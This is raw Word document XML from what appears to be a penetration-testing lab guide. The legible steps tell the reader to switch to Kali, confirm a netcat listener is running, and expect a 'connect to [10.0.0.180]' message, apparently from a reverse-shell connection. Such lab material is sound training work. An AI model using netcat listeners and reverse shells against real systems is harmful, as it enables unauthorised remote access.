          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1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l e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>x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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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2"/>
          <w:position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position w:val="-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-1"/>
          <w:position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logo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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. (Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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 xml:space="preserve">u </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-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position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v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e to log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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her in t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w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pacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position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2"/>
          <w:position w:val="-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or it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> t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o work).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="176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6"/>
        <w:gridCol w:w="6195"/>
        <w:gridCol w:w="703"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="294"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="306" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="25"/>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>b.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="25"/>
              <w:ind w:left="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>wi</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ch</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">o </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>K</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>li.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</w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="898"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="306" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="2"/>
              <w:ind w:left="40"/>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>c.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6195" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:before="2"/>
              <w:ind w:left="94"/>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>V</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>eri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">y </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>h</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ur net</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>a</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>lis</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-3"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ener is r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nni</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>g.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>You</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>h</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>u</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-3"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>d</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040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Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>e:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="280" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="94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color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ne</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">t </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">o </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
